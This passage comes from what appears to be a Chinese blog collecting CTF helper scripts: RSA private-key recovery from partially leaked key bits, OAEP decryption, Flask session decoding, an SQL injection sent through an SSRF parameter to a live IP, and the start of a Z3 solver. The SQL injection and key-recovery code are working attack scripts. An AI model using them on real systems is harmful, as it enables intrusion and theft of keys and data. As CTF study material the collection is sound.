:c :  :  :  :b :  :  :  :  :</span></span><br><span class="line"><span class="string">      :ab: e: 2: 8:c :  :  : 1:6 :6 : 6: f:d9: 0:</span></span><br><span class="line"><span class="string">    8 :5c:7 :06:  :  :  :0 : 3:5 :4b:  :6 :  :  :</span></span><br><span class="line"><span class="string">    2 :  :6 :  :  :  :2 :bc: c:  :85:1 : 1:d : 3:</span></span><br><span class="line"><span class="string">     1:b4:  : b: 1: 3: d:a :  :  :6e: 0:b :2 :  :</span></span><br><span class="line"><span class="string">      :b :  :9 :e :  :82:8d:  :  :13:  :  : a: a:</span></span><br><span class="line"><span class="string">      :  :4 :  :c : f:  :  :7 :e :0a:  :  : b: 5:</span></span><br><span class="line"><span class="string">      : e:91:3 :  :3c: 9:  : 6:  :  :b5:7d: 1:  :</span></span><br><span class="line"><span class="string">      :  :  :b :a1:99:6 :4 :3 :c :1a:02:4 :  : 9:</span></span><br><span class="line"><span class="string">    9 :f : d:bd:  :0 :  :  :  :b3:  : 4:  :e9: 9:</span></span><br><span class="line"><span class="string">      : d:  :  :7 :  :93:  : e:dc:  : 0:  :e7:  :</span></span><br><span class="line"><span class="string">    e :  :2 : b: 2:5 :  :  :  :  : c:5f:  :  :e2:</span></span><br><span class="line"><span class="string">      :  : 9:  :2a:  : e:  :  :2 :  :9f: 7:3 :  :</span></span><br><span class="line"><span class="string">    b : f:b :  : 8: 7:  :  :f :6 :e :c :  :3 :  :</span></span><br><span class="line"><span class="string">    f7: 5: 8: 5:  :  :  :  :  : 8: e:  :03: c:  :</span></span><br><span class="line"><span class="string">    33:76:e : 1:7 : c:  : 0:  :0b:  : a:  : 2: 9:</span></span><br><span class="line"><span class="string">      :c8:bf:  :  :06: 7:d5:  :02: c:b :e2: 7:2 :</span></span><br><span class="line"><span class="string">      :  """</span>)</span><br><span class="line"></span><br><span class="line">q_ranges, qmask_msk, qmask_val = msk(<span class="string">""" 0: f:  :d0: 1:55: 4:31:  : b:c4:8 :  : e: d:</span></span><br><span class="line"><span class="string">    34: 3:f :  :  :  :  : 8:99:1 :  : a:0 :  :4 :</span></span><br><span class="line"><span class="string">    0 :  :f :  :a4:41:2 :  :a :  : 1:  : a: c:  :</span></span><br><span class="line"><span class="string">      :  : 9:  :  : 2:f4: f:  :  :  :  :1 : 4:9 :</span></span><br><span class="line"><span class="string">    a :  :  :79:0 :  :  :  :  : 2: 8:b :  :4 : 8:</span></span><br><span class="line"><span class="string">      :9b: 1:  :d :  :f :e4:  :4 :c :e :  :3 :  :</span></span><br><span class="line"><span class="string">     7:2 :  :d :8 :2 :7 :  :d :67:fc:e : 0:f9: 7:</span></span><br><span class="line"><span class="string">    8 :  :  :  :1 :2f:  :51:  :  :2e:0a: e:3d: 6:</span></span><br><span class="line"><span class="string">    b :  :dd:  : 0:fb:  :f4:  :  :  :b4: 9:c :  :</span></span><br><span class="line"><span class="string">     a:  :  :  :d :  :  :6b: 2:  :9b: a:60:  :d6:</span></span><br><span class="line"><span class="string">     0:4f:16:d1:  :  :5 :fc:  :f :  :8 :  :  :  :</span></span><br><span class="line"><span class="string">     1: 6:e1:9 : e:4 : 6: c: d:d :73: 3:  :  :7 :</span></span><br><span class="line"><span class="string">      :8 : 9:  :3b:f : 2:  :  :f1: e:  :  :1e:  :</span></span><br><span class="line"><span class="string">    8 :  :  : 6:0 : 4:99:e :  : 5:  :  : 4:  :  :</span></span><br><span class="line"><span class="string">      : a:81:64:  :7 :f : 9: d:  :9 :  : 7:93:f :</span></span><br><span class="line"><span class="string">    ac:8c:  : 8:  : 0: d: 8:  :7 :  :1d:  :f :  :</span></span><br><span class="line"><span class="string">    1 :a :6 :8 :  :60:  :b3:  :  :  :89:  :  :14:</span></span><br><span class="line"><span class="string">      :5 """</span>)</span><br><span class="line"></span><br><span class="line">_, dmask_msk, dmask_val = msk(<span class="string">"""  :  :  : f:8 :a5:d : 2: 0:b :7 :  : 1:  : 4:</span></span><br><span class="line"><span class="string">     1:0d:  :3 :  :6 :  :  : b:  :  :  :e :  :  :</span></span><br><span class="line"><span class="string">    0e: 0:db:  :1a:1c:c0:  : e:  :  :99:bc:8 :a5:</span></span><br><span class="line"><span class="string">    7 :7 :7 : b:  :  : 8: 8:  :7 :55: 2:  :  :f :</span></span><br><span class="line"><span class="string">    b2:  :  :b :f :4 :  : 8:  :b :  :  :  : 0:  :</span></span><br><span class="line"><span class="string">    0 :  :6 :9 :  :  :  : b: 4:  : 0: a: 5:07:b :</span></span><br><span class="line"><span class="string">     9: c:9a: 9:  : 7:9e:  : b:60:f :  :  :  :0 :</span></span><br><span class="line"><span class="string">      : 3:0 :  :  :  : 1:b :  :  : b: 6:0 :f :  :</span></span><br><span class="line"><span class="string">      : 2:18: 6: b:1 :  :  :  :  :d3:f3:  :a :  :</span></span><br><span class="line"><span class="string">     3:  :  :  :  : 3: d: 1: 2:7 :  : d:  : 2: d:</span></span><br><span class="line"><span class="string">      :  : d:4 :  :d :  :6d: c:a :b6:  :  :  : 1:</span></span><br><span class="line"><span class="string">    69:  : 7:  :89:  :c :8 :61: d:25: 3:7 :1b: 4:</span></span><br><span class="line"><span class="string">    b :  :8 :55:  :49: 1:2 :3 :  :1 :e9:a8: 3:  :</span></span><br><span class="line"><span class="string">    9 :  : 1:f8:d3:  :e :  :d :  :9 :b6:  :  :71:</span></span><br><span class="line"><span class="string">    1 :  :c1:  : b: 1:  : 6:e :  :64:  :  :1a:c :</span></span><br><span class="line"><span class="string">      : b:  :bf:c :  : 0:  : 8:a :4 :  :26:a :5 :</span></span><br><span class="line"><span class="string">    6 :  :  :  :eb:  :e5: a:  :3e:f9:10:0 :  :  :</span></span><br><span class="line"><span class="string">     6:0 :  : 8:  : 1:72: c:0 : f:5 : f:9c: 0: e:</span></span><br><span class="line"><span class="string">     7:b :  :  :  :  :d9: 4:  : e:c :68:  :  :  :</span></span><br><span class="line"><span class="string">     c:  :3a:  :  :a0:ea: 3: 4:  :72:a :d : 8:  :</span></span><br><span class="line"><span class="string">      :0d:5 :0 : a: 7:c :bb: 6: 4:a :ce:d :2 : 1:</span></span><br><span class="line"><span class="string">      :  :17:6 :  : c: b:  : f:  :3 : 5:6 :3 :0e:</span></span><br><span class="line"><span class="string">      : 7:c :3e: 2: 9: 7: 6: f: e: f: 9:  :f3: 9:</span></span><br><span class="line"><span class="string">    a :c1:6 :  : 1:9 :  :43:  : f: 5:  :0 :27: 4:</span></span><br><span class="line"><span class="string">    4 :a :  :e9:  : 8: 4:3 :8a: 6:16:d5:c : e: e:</span></span><br><span class="line"><span class="string">      :d : c:b :a8:  : 7:  : 9:  :7 :7d:  :  :  :</span></span><br><span class="line"><span class="string">      :  :  :4 :2 :  : 3: 3: 6:  :  :  :7b:0 :  :</span></span><br><span class="line"><span class="string">     e:  :0 :  :a :  : 5:  :  :  : 5:1 :82:c :0d:</span></span><br><span class="line"><span class="string">    4 :2 :fd:36: 5:50:0 :  :  :d : f: 6:  :  :e :</span></span><br><span class="line"><span class="string">    0 :  :  :ce:  :9e:8 :  :0 :d :07:b3:  :  :  :</span></span><br><span class="line"><span class="string">    0 :e4:  :  :68:b :c :  : c:5 :  :  :3 : 7: 2:</span></span><br><span class="line"><span class="string">     c:e0:  :5 :  :  :b4:  :ef: 7:  :1 :e : 0:f :</span></span><br><span class="line"><span class="string">      :6 :  :  :  :e0:c :3 :  :  : 3:  : d:  :  :</span></span><br><span class="line"><span class="string">     3: 3: c: a:  :b : a:71: 3: 0:a :  :4 :5d:  :</span></span><br><span class="line"><span class="string">    0 :4 """</span>)</span><br><span class="line"></span><br><span class="line">_, dpmask_msk, dpmask_val = msk(<span class="string">"""  : 3:2a:  : d:  :  :  :  :0 :1 : f:  :  : 6:</span></span><br><span class="line"><span class="string">    1 :2 :1b:07: a:e :b :c5:58:7 :  :e8: 7: 1: c:</span></span><br><span class="line"><span class="string">      : 1:b :a0: 4:0f:5 :67:  :3 :7 :6 :f9:  : c:</span></span><br><span class="line"><span class="string">      :79: 0:1 :65:  :8 :  :99: d:d :  :2 :9 :0 :</span></span><br><span class="line"><span class="string">     e:  :0 :  :  :  : d:  :d :7 :6 :a9: a:8b: b:</span></span><br><span class="line"><span class="string">      :  : 7: a:37:  :  :7 :1 :6 :  :c2: 7:6 :b :</span></span><br><span class="line"><span class="string">     e:  :  :  :  :  :  :b :3a:5 :  :  :  :  :  :</span></span><br><span class="line"><span class="string">      :  :  :cd:8 :  : d:  :7 : 3:  : f:e : c:  :</span></span><br><span class="line"><span class="string">      : a:  :c : f:c : 7:b :5 :  :  :2 :8 :8 :6 :</span></span><br><span class="line"><span class="string">    0a: a:  :  :3 :db:  : 4:00:  : d:  :b : 5:  :</span></span><br><span class="line"><span class="string">    20: 2: 5:  :82:  : 0: 6:  :8a:  :7 :  : 8:  :</span></span><br><span class="line"><span class="string">     4: 1:  :  :  : 8:46:  :  :  :  :  : 0:f :c8:</span></span><br><span class="line"><span class="string">    2 :  : c:7 :  : 1:  :  :2 : 0: 5:  :  : 1:9b:</span></span><br><span class="line"><span class="string">     6:9 : 0:74:  :c :  :e :  :  :cb:b :3 :3 :  :</span></span><br><span class="line"><span class="string">     2:  :  :47:  :2 : 0:5 :  :  : d: 6:83:  :  :</span></span><br><span class="line"><span class="string">      :c7:  :  :0b:  :  : c:  :3 :8 :  :9 :4 : 7:</span></span><br><span class="line"><span class="string">    5 :c0:fe:  :f9: 1:  :0 : e: 8:02:  : f:  :c :</span></span><br><span class="line"><span class="string">    55:61"""</span>)</span><br><span class="line"></span><br><span class="line">_, dqmask_msk, dqmask_val = msk(<span class="string">"""  :0b:7 :4 :0 : 0:6 : 7:7e:  : 5:  : 7:  : a:</span></span><br><span class="line"><span class="string">    a :d : 0: 6: 4:86:  :  :8 :  :  :  :  :e :8f:</span></span><br><span class="line"><span class="string">     9:  :  :  : 1:  :2 :  : 7: b:1 :5 : f:  :8 :</span></span><br><span class="line"><span class="string">      :d :21:  :e : d:  :c9:e : b:  :  :1 :  :  :</span></span><br><span class="line"><span class="string">      :d :a2:b7:  :  :  :f3:  :42:  :e : c:  :f :</span></span><br><span class="line"><span class="string">      : 0:f :7 : 4: 5:34:  :4 : c:  :  :8 :d : 8:</span></span><br><span class="line"><span class="string">    5 :af: 3:1d: 5:4 :  :2 :  :6 :c : 6:a :1 :5 :</span></span><br><span class="line"><span class="string">     a:9 :  :d :  :  :0a:a1:  :f :7 :9 :b :  :  :</span></span><br><span class="line"><span class="string">     f:2 :27: f:  :0 :f6:4d:  :  :  :  :  :5 :  :</span></span><br><span class="line"><span class="string">     4:08:  : 5:  : 8: 5:  :  :  :18: 4: 8:57: 2:</span></span><br><span class="line"><span class="string">     f: a:  :  :a8: f: c:f : e: 1:9 :c : 4:9 :  :</span></span><br><span class="line"><span class="string">      :  :  :  :  : 1:  :2 :  :d1:  : 6:e : d:  :</span></span><br><span class="line"><span class="string">      : f:04:2 :8d:  : 3:  :  :b : 8:  :d6:  : 2:</span></span><br><span class="line"><span class="string">      :  :  :6 :  : f:  :  : 0:6 :  :51:  :48:19:</span></span><br><span class="line"><span class="string">      :  :  :69:4 : c:  :c :  : f:  :f4:d :  : f:</span></span><br><span class="line"><span class="string">     d:0 :0d:b :3 : 3:2 :  :  :6 : b:5 :2 :  : c:</span></span><br><span class="line"><span class="string">     1:5a: f:f :  :  :7e:3e:  :d :f :0 : d: c: 6:</span></span><br><span class="line"><span class="string">     1"""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(K, Kp, Kq, check_level, break_step)</span>:</span></span><br><span class="line">    max_step = <span class="number">0</span></span><br><span class="line">    cands = [<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> range(<span class="number">1</span>, break_step + <span class="number">1</span>):</span><br><span class="line">        <span class="comment">#print " ", step, "( max =", max_step, ")"</span></span><br><span class="line">        max_step = max(step, max_step)</span><br><span class="line"></span><br><span class="line">        mod = <span class="number">1</span> &lt;&lt; (<span class="number">4</span> * step)</span><br><span class="line">        mask = mod - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        cands_next = []</span><br><span class="line">        <span class="keyword">for</span> p, new_digit <span class="keyword">in</span> product(cands, p_ranges[-step]):</span><br><span class="line">            pval = (new_digit &lt;&lt; ((step - <span class="number">1</span>) * <span class="number">4</span>)) | p</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">1</span>:</span><br><span class="line">                qval = solve_linear(pval, N &amp; mask, mod)</span><br><span class="line">                <span class="keyword">if</span> qval <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(qval, mask, qmask_msk, qmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">2</span>:</span><br><span class="line">                val = solve_linear(E, <span class="number">1</span> + K * (N - pval - qval + <span class="number">1</span>), mod)</span><br><span class="line">                <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(val, mask, dmask_msk, dmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">3</span>:</span><br><span class="line">                val = solve_linear(E, <span class="number">1</span> + Kp * (pval - <span class="number">1</span>), mod)</span><br><span class="line">                <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(val, mask, dpmask_msk, dpmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">4</span>:</span><br><span class="line">                val = solve_linear(E, <span class="number">1</span> + Kq * (qval - <span class="number">1</span>), mod)</span><br><span class="line">                <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(val, mask, dqmask_msk, dqmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> pval * qval == N:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"Kq ="</span>, Kq</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"pwned"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"p ="</span>, pval</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"q ="</span>, qval</span><br><span class="line">                    p = pval</span><br><span class="line">                    q = qval</span><br><span class="line">                    d = invmod(E, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">                    coef = invmod(p, q)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">                    <span class="keyword">print</span> RSA.construct(map(long, (N, E, d, p, q, coef))).exportKey()</span><br><span class="line">                    quit()</span><br><span class="line"></span><br><span class="line">            cands_next.append(pval)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> cands_next:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        cands = cands_next</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_val</span><span class="params">(val, mask, mask_msk, mask_val)</span>:</span></span><br><span class="line">    test_mask = mask_msk &amp; mask</span><br><span class="line">    test_val = mask_val &amp; mask</span><br><span class="line">    <span class="keyword">return</span> val &amp; test_mask == test_val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># K = 4695</span></span><br><span class="line"><span class="comment"># Kp = 15700</span></span><br><span class="line"><span class="comment"># Kq = 5155</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> K <span class="keyword">in</span> range(<span class="number">1</span>, E):</span><br><span class="line">    <span class="keyword">if</span> K % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"checking"</span>, K</span><br><span class="line">    <span class="keyword">if</span> search(K, <span class="number">0</span>, <span class="number">0</span>, check_level=<span class="number">2</span>, break_step=<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"K ="</span>, K</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Kp <span class="keyword">in</span> range(<span class="number">1</span>, E):</span><br><span class="line">    <span class="keyword">if</span> Kp % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"checking"</span>, Kp</span><br><span class="line">    <span class="keyword">if</span> search(K, Kp, <span class="number">0</span>, check_level=<span class="number">3</span>, break_step=<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Kp ="</span>, Kp</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Kq <span class="keyword">in</span> range(<span class="number">1</span>, E):</span><br><span class="line">    <span class="keyword">if</span> Kq % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"checking"</span>, Kq</span><br><span class="line">    <span class="keyword">if</span> search(K, Kp, Kq, check_level=<span class="number">4</span>, break_step=<span class="number">9999</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Kq ="</span>, Kq</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="最优非对称加密填充"><a href="#最优非对称加密填充" class="headerlink" title="最优非对称加密填充"></a>最优非对称加密填充</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#最优非对称加密填充</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./tmp/pubkey.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br><span class="line"><span class="keyword">print</span> N</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./tmp/private.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    private = RSA.importKey(f)</span><br><span class="line">    oaep = PKCS1_OAEP.new(private)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./tmp/flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">print</span> oaep.decrypt(f.read())</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="session解密脚本"><a href="#session解密脚本" class="headerlink" title="session解密脚本"></a>session解密脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="sql注入get多参数爆破脚本"><a href="#sql注入get多参数爆破脚本" class="headerlink" title="sql注入get多参数爆破脚本"></a>sql注入get多参数爆破脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'http://111.198.29.45:57232/download.php'</span></span><br><span class="line"><span class="comment"># subquery = "database()"</span></span><br><span class="line"><span class="comment"># ssrfw</span></span><br><span class="line"><span class="comment"># subquery = "select table_name from information_schema.tables where table_schema='ssrfw' LIMIT 1"</span></span><br><span class="line"><span class="comment"># cetcYssrf</span></span><br><span class="line"><span class="comment"># subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1"</span></span><br><span class="line"><span class="comment"># secretname -&gt; flag</span></span><br><span class="line"><span class="comment"># subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1, 1"</span></span><br><span class="line"><span class="comment"># value -&gt; flag&#123;cpg9ssnu_OOOOe333eetc_2018&#125;</span></span><br><span class="line">subquery = <span class="string">"select value from cetcYssrf LIMIT 1"</span></span><br><span class="line">id = random.randint(<span class="number">1</span>, <span class="number">10000000</span>)</span><br><span class="line">d = (<span class="string">'http://127.0.0.1/secret/secret_debug.php?'</span> +</span><br><span class="line">        urllib.parse.urlencode(&#123;</span><br><span class="line">            <span class="string">"s"</span>: <span class="string">"3"</span>,</span><br><span class="line">            <span class="string">"txtfirst_name"</span>: <span class="string">"L','1',("</span>+subquery+<span class="string">"),'1'/*"</span>,</span><br><span class="line">            <span class="string">"txtmiddle_name"</span>: <span class="string">"m"</span>,</span><br><span class="line">            <span class="string">"txtLast_name"</span>: <span class="string">"y"</span>,</span><br><span class="line">            <span class="string">"txtname_suffix"</span>: <span class="string">"Esq."</span>,</span><br><span class="line">            <span class="string">"txtdob"</span>: <span class="string">"*/,'12/19/2019"</span>,</span><br><span class="line">            <span class="string">"txtdl_nmbr"</span>: id,</span><br><span class="line">            <span class="string">"txtRetypeDL"</span>: id</span><br><span class="line">            &#125;) + <span class="string">"&amp;"</span>)</span><br><span class="line">r = requests.get(url, params=&#123;<span class="string">"dl"</span>: d&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Z3解方程脚本"><a href="#Z3解方程脚本" class="headerlink" title="Z3解方程脚本"></a>Z3解方程脚本</h2><p>by巴伐利亚师傅<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v0=Int(<span class="string">'v0'</span>)</span><br><span class="line">v1=Int(<span class="string">'v1'</span>)</span><br><span class="line">v2=Int(<span class="string">'v2'</span>)</span><br><span class="line">v3=Int(<span class="string">'v3'</span>)</span><br><span class="line">v4=Int(<span class="string">'v4'</span>)</span><br><span class="line">v5=Int(<span class="string">'v5'</span>)</span><br><span class="line">v6=Int(<span class="string">'v6'</span>)</span><br><span class="line">v7=Int(<span class="string">'v7'</span>)</span><br><span class="line">v8=Int(<span class="string">'v8'</span>)</span><br><span class="line">v9=Int(<span class="string">'v9'</span>)</span><br><span class="line">v10=Int(<span class="string">'v10'</span>)</span><br><span class="line">v11=Int(<span class="string">'v11'</span>)</span><br><span class="line">v12=Int(<span class="string">'v12'</span>)</span><br><span class="line">v13=Int(<span class="string">'v13'</span>)</span><br><span class="line">v14=Int(<span class="string">'v14'</span>)</span><br><span class="line">v15=Int(<span class="string">'v15'</span>)</span><br><span class="line">v16=Int(<span class="string">'v16'</span>)</span><br><span class="line">v17=Int(<span class="string">'v17'</span>)</span><br><span class="line">v18=Int(<span class="string">'v18'</span>)</span><br><span class="line">v19=Int(<span class="string">'v19'</span>)</span><br><span class="line">v20=Int(<span class="string">'v20'</span>)</span><br><span class="line">v21=Int(<span class="string">'v21'</span>)</span><br><span class="line">v22=Int(<span class="string">'v22'</span>)</span><br><span class="line">v23=Int(<span class="string">'v23'</span>)</span><br><span class="line">v24=Int(<span class="string">'v24'</span>)</span><br><span class="line">v25=Int(<span class="string">'v25'</span>)</span><br><span class="line">v26=Int(<span class="string">'v26'</span>)</span><br><span class="line">v27=Int(<span class="string">'v27'</span>)</span><br><span class="line">v28=Int(<span class="string">'v28'</span>)</span><br><span class="line">v29=Int(<span class="string">'v29'</span>)</span><br><span class="line">v30=Int(<span class="string">'v30'</span>)</span><br><span class="line">v31=Int(<span class="string">'v31'</span>)</span><br><span class="line">v32=Int(<span class="string">'v32'</span>)</span><br><span class="line">v33=Int(<span class="string">'v33'</span>)</span><br><span class="line">v34=Int(<span class="string">'v34'</span>)</span><br><span class="line"></span><br><span class="line">s = 